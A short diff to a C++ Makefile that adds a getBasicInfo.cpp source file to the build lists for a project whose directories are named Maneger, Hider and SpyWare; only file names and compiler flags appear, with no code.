@@ -7,9 +7,9 @@ CC = g++
 CFLAGS = -Wall -Wextra -std=c++17
 
 # Source files
-M_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/Maneger/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp
+M_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/Maneger/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp
 H_SRCS = src/Hider/Hider.cpp src/Hider/HiddenFileHandler.cpp src/IncludeCPP/encoding.cpp
-S_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/SpyWare/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/SpyWare/Contraption.cpp src/SpyWare/ContraptionAdmin.cpp src/SpyWare/Sniffer.cpp  src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp
+S_SRCS = src/Maneger/Connection.cpp src/Maneger/HiderManeger.cpp src/SpyWare/main.cpp src/Maneger/SoftwareManeger.cpp src/IncludeCPP/encoding.cpp src/SpyWare/Contraption.cpp src/SpyWare/ContraptionAdmin.cpp src/SpyWare/Sniffer.cpp  src/Maneger/SocketConnection.cpp src/Maneger/PipeConnection.cpp src/Maneger/BufferConnection.cpp src/IncludeCPP/getBasicInfo.cpp
 
 
 
